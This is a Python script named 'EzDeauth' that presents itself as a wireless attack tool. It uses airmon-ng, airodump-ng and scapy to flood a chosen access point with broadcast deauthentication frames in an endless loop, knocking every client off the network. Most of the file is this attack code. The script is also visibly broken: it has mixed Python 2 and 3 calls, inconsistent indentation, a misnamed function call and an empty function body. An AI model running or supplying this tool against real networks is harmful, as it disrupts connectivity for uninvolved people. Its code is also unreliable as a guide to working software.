# Create python3 
# Author W0lweR


from scapy.all import * #Importing Scapy allows me Deauthenticate everyone from a target network
import subprocess #Importing subprocess because it allows me to call certain commands in the terminal, such as airmon-ng and airodump-ng
import urllib.request  as urllib2 
import re
import sys,os
import random
import time

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'

subprocess.call('clear', shell=True) #Clear the terminal screen

def Start():
	subprocess.call('clear', shell=True) #Clear the terminal screen
	print(B+'''
	Install dependinces/requeriments?'''+E)
	query_yes_no("Install? ")



def Main_Menu(): #main menu
	banner()
	print('\n')
	print(B+'''
	Options:
  	'''+E+'''
  	1) Deauth attack
  	2) INFO
 	3) Soon... 
  	'''+W+'''-------------------'''+E)
	try:
		v = input('EzDeauth-»')
	except:
		print(' Good bye! ')
		exit()
	
	if v == 'help':
		INFO()
	elif int(v) == 1:
		DEAUTH()
	elif int(v) == 2:
		INFO()
	elif int(v) == 3:
		Soon()
	else:
		print(F+'[!]'+' You entered an incorrect value '+E)
		exit()

def SOON():
	banner()
    print(F+'[!]'+' This function will be avalible soon... '+E)

def INFO():
	VERSION = B+'0.1'+E
	AUTHOR =  B+'W0lweR'+E
	print("""
		#################################
		#                               # 
		#          Version-> %s        #
		#                               #
		#          Author->  %s     # 
		#                               #
		#################################
		""" % (VERSION, AUTHOR))

def banner(): #banner
    print("""

 ______     _____                   _   _     
|  ____|   |  __ \                 | | | |    
| |__   ___| |  | | ___  __ _ _   _| |_| |__  
|  __| |_  / |  | |/ _ \/ _` | | | | __| '_ \ 
| |____ / /| |__| |  __/ (_| | |_| | |_| | | |
|______/___|_____/ \___|\__,_|\__,_|\__|_| |_|
                                              
                                              
                                              """)

def DEAUTH():
	print('Now listing available network cards')
	print('\n'*3)

	subprocess.call('airmon-ng', shell=True) #Call airmon-ng to show the user a list of available network cards on their device

	print('\n'*3)
	#start up monitor mode on a network card
	networkCard = raw_input('Please enter the name of the network card you wish to use: ')

	#Start monitor mode on the selected device and run 'airmon-ng check kill' to kill of any processes that may be interfering with the network card
	subprocess.call('airmon-ng start {}'.format(networkCard), shell=True)
	subprocess.call('airmon-ng check kill', shell=True)

	networkCard = '{}mon'.format(networkCard) #By default airmon-ng adds mon to the end of a network cards name

	#try to scan for available network cards on the device
	try:
		subprocess.call('clear', shell=True) #Clear the terminal screen
		print('Now scanning for available networks, press ctrl+c to exit the scan')
		subprocess.call('airodump-ng {}'.format(networkCard), shell=True) #Use airodump-ng to start scanning for available networks
	except KeyboardInterrupt: #If the user tries to end the program with ctrl+c then the program will pick this up and continue running the rest of the code, so that the user is able to see the output of the scan
		print(''*3)


	brdMac = 'ff:ff:ff:ff:ff:ff' #brdMac is the broadcast macaddress variable, we set it to all f's because we want to hide where we are sending the packets from
	BSSID = raw_input('Please enter the BSSID/MAC address of the AP: ') #Let the user input the MAC address of the router
	CH = raw_input('Please ener chanel of the AP: ')
	print('Sending deauth packets now, press ctrl+c to end the attack')
	print(''*5)

	#attack starting 
	try:
	        #infinite loop to keep the attack running forever, this loop is for setting up the deauth packet and sending it
		while True:                
	                #This creates a Dot11Deauth packet that will be used to kick everyone of the target network
	                #Addr1 is the broadcast addr
	                #Addr2 is the target addr
	                #Addr3 is used to target specific clients but I set it to the target addr to kick everyone off the network	
			pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID)/ Dot11Deauth()
			sendp(pkt, iface = networkCard, count = 10000, inter = .2) #Send deauth packet
	except KeyboardInterrupt: #Caputer the user pressing crtl+c to exit the program. Then the code stops monitor mode on the network card and closes out
		print('Cleaning up...')
		subprocess.call('airmon-ng stop {}'.format(networkCard), shell=True) #stop monitor mode on the network card
		subprocess.call('clear', shell=True) #Clear terminal window

def HELP():
	print("""
		1) Deauth - deauth attack on selected AP
		2) Info - information about programm
		3) Soon
		""")

def EXIT_REQ():
	print(F+'[!]'+' Do you want to exit? '+E)
	print(F+'[!]'+' Y/N '+E)
	query_yes_no("Exit? ")

def query_yes_no(question, default="yes"): #dont touch!
    """Ask a yes/no question via raw_input() and return their answer.

    "question" is a string that is presented to the user.
    "default" is the presumed answer if the user just hits <Enter>.
        It must be "yes" (the default), "no" or None (meaning
        an answer is required of the user).

    The "answer" return value is True for "yes" or False for "no".
    """
    valid = {"yes": True, "y": True, "ye": True,
             "no": False, "n": False}
    if default is None:
        prompt = " [y/n] "
    elif default == "yes":
        prompt = " [Y/n] "
    elif default == "no":
        prompt = " [y/N] "
    else:
        raise ValueError("invalid default answer: '%s'" % default)

    while True:
        sys.stdout.write(question + prompt)
        choice = raw_input().lower()
        if default is not None and choice == '':
            return valid[default]
        elif choice in valid:
            return valid[choice]
        else:
            sys.stdout.write("Please respond with 'yes' or 'no' "
                             "(or 'y' or 'n').\n")

def ERROR():
	print("""
	 _____                     _ 
	| ____|_ __ _ __ ___  _ __| |
	|  _| | '__| '__/ _ \| '__| |
	| |___| |  | | | (_) | |  |_|
	|_____|_|  |_|  \___/|_|  (_)
                             
      """)
    print("Uncnown error! This message will disapeare in 3 sec.")
    time.sleep(3)

def LOAD():

Start()